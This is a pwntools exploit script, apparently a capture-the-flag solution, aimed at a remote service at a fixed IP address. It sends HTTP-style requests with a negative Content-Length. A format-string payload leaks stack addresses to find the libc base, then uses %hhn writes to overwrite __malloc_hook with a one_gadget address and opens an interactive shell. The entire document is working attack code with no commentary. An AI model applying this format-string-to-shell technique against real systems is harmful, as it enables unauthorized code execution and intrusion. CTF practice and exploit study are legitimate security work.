from pwn import *

p = remote('47.105.94.48','12435')

payload1 = "%213$p\n%212$p"
fmt = f'''GET / HTTP/1.1
Host: 127.0.0.1
Content-Length: -1

{payload1}
'''
p.sendlineafter('>', fmt)
leak1 = int(p.recvline().strip(), 16)
leak2 = int(p.recvline().strip(), 16)
print(hex(leak2))
print(hex(leak1))
malloc_hook = leak1+0x3ca099
print(hex(malloc_hook))
libc = ELF('./libc-2.27.so')
libc.address = malloc_hook-libc.sym['__malloc_hook']

onegadget = p64(libc.address+0x4f3c2)
print(hex(u64(onegadget)))

t = [ord(onegadget[i]) for i in range(6)]

t.sort()
print(t)
prev = 0
pay = ''
for i in range(6):
    pay = pay + 'a'*(t[i]-prev)
    prev = t[i]
    pay = pay+'%'+str(215+[ord(onegadget[i]) for i in range(6)].index(prev))+'$hhn'
print(pay)

pay = pay.ljust(0x200,'A') + '\x00'*5+p64(malloc_hook+0)+p64(malloc_hook+1)+p64(malloc_hook+2) + p64(malloc_hook+3)+p64(malloc_hook+4)+p64(malloc_hook+5)
fmt = f'''GET / HTTP/1.1
Host: 127.0.0.1
Content-Length: -1

{pay}
'''

p.sendafter('>', fmt)
fmt = '''GET / HTTP/1.1
Host: 127.0.0.1
Content-Length: -1

%100000c
'''
p.sendafter('>', fmt)

p.interactive()